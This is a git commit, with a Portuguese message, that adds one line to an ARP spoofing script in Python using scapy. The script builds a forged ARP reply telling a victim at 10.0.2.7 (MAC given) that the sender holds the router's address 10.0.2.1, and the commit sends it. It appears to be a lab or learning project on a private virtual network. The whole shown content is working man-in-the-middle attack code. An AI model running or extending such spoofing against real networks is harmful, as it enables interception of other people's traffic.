b3414020b4e49b8b159a50c6f08514ccca87126d
Mariacmv <mariaclaragmviana@gmail.com>
2025-10-21 15:19:56 -0300

    Enviando o pacote arp

--- ARP_Spoofer/arp_spoof.py
+++ ARP_Spoofer/arp_spoof.py
@@ -4,3 +4,4 @@ import scapy.all as scapy
 
 #cria o pacote arp
 packet = scapy.ARP(op=2, pdst="10.0.2.7", hwpdst="08:00:27:08:af:07", psrc="10.0.2.1") #estou dizendo a vítima: eu tenho o endereço do roteador
+scapy.send(packet) #enviando o pacote
